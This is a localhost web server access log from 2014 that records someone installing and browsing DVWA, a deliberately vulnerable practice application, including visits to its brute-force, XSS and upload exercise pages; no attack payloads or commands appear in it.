0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:18 +0000] "GET / HTTP/1.1" 200 845 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:18 +0000] "GET /jetty_banner.gif HTTP/1.1" 200 47804 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:18 +0000] "GET /favicon.ico HTTP/1.1" 200 717 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:19 +0000] "GET / HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:19 +0000] "GET /jetty_banner.gif HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:21 +0000] "GET / HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:42:21 +0000] "GET /jetty_banner.gif HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:43:27 +0000] "GET / HTTP/1.1" 200 845 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:43:27 +0000] "GET /jetty_banner.gif HTTP/1.1" 200 47804 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:43:28 +0000] "GET /favicon.ico HTTP/1.1" 200 717 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:43:28 +0000] "GET / HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:43:28 +0000] "GET /jetty_banner.gif HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:51:13 +0000] "GET / HTTP/1.1" 503 1307 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:51:16 +0000] "GET /lab HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:51:16 +0000] "GET /lab/ HTTP/1.1" 200 5498 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:56:07 +0000] "GET / HTTP/1.1" 503 1307 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:56:10 +0000] "GET /dvwa HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:56:10 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:56:10 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:12:56:10 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 200 6749 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:00:36 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:00:36 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 200 3945 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:00:36 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 200 775 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:00:36 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 200 716 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:00:36 +0000] "GET /dvwa/favicon.ico HTTP/1.1" 200 1406 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:00:48 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:00 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:00 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:01 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:01 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:44 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:52 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:09:52 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:52 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:52 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:53 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:53 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:53 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:53 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:53 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:54 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:10:54 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:11 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:11 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:11 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:11 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:11 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:12 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:12 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:16 +0000] "GET / HTTP/1.1" 503 1307 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:18 +0000] "GET /dvwa HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:18 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:18 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:18 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:18 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:20 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:21 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:21 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:29 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:29 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:30 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:30 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:30 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:30 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:30 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:32 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:11:32 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:22 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:22 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:22 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:22 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:22 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:23 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:23 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:25 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:25 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:25 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:25 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:25 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:28 +0000] "GET / HTTP/1.1" 503 1307 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:29 +0000] "GET /dvwa HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:29 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:29 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:30 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:30 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:30 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:30 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:30 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:30 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:31 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:31 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:31 +0000] "GET /dvwa/login.php HTTP/1.1" 200 205 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:31 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:31 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:32 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:13:32 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:14:59 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:14:59 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:14:59 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:14:59 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:14:59 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:00 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:00 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:08 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:09 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:09 +0000] "GET /dvwa/dvwa/images/spanner.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:09 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:09 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:09 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:10 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:15:10 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3796 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:16:30 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:16:30 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:16:31 +0000] "GET /dvwa/dvwa/css/login.css HTTP/1.1" 200 608 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:16:31 +0000] "GET /dvwa/dvwa/images/login_logo.png HTTP/1.1" 200 12875 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:17:44 +0000] "POST /dvwa/login.php HTTP/1.1" 200 43 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:17:47 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:17:52 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:18:41 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:18:42 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 4035 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:07 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:07 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:12 +0000] "POST /dvwa/login.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:12 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1263 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:22 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:22 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:43 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3673 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:43 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:19:44 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 4035 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:20:27 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:20:27 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:20:29 +0000] "GET /dvwa/instructions.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:20:29 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:20:57 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:20:57 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:21:00 +0000] "POST /dvwa/login.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:21:00 +0000] "GET /dvwa/index.php HTTP/1.1" 200 4705 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:21:02 +0000] "GET /dvwa/index.php HTTP/1.1" 200 4618 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:21:02 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:21:02 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:21:02 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:23:49 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4661 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:24:35 +0000] "GET /dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1" 200 4772 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:29:31 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 4990 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:29:35 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5115 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:29:45 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5239 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:29:46 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=xss_s&security=high HTTP/1.1" 200 3475 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:29:46 +0000] "GET /dvwa/dvwa/css/source.css HTTP/1.1" 200 244 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:30:53 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=xss_s&security=high HTTP/1.1" 200 2070 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:30:53 +0000] "GET /dvwa/dvwa/css/help.css HTTP/1.1" 200 244 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:04 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4230 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:04 +0000] "GET /dvwa/dvwa/images/lock.png HTTP/1.1" 200 1025 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:10 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:10 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4311 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:13 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5204 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:17 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5300 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:24 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5396 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:24 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:24 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:24 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:25 +0000] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4453 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:26 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5396 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:31 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5396 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:31 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:31 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:31 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:36 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5492 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:44 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5576 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:46 +0000] "GET /dvwa/vulnerabilities/upload/ HTTP/1.1" 200 4652 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:47 +0000] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4453 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:47 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5576 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:57 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4228 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:59 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:31:59 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4314 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:00 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5657 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:06 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3678 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:07 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:07 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 4040 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:09 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 4990 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:12 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4230 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:15 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:15 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4311 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:16 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 4987 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:24 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5071 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:26 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5155 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:26 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:26 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
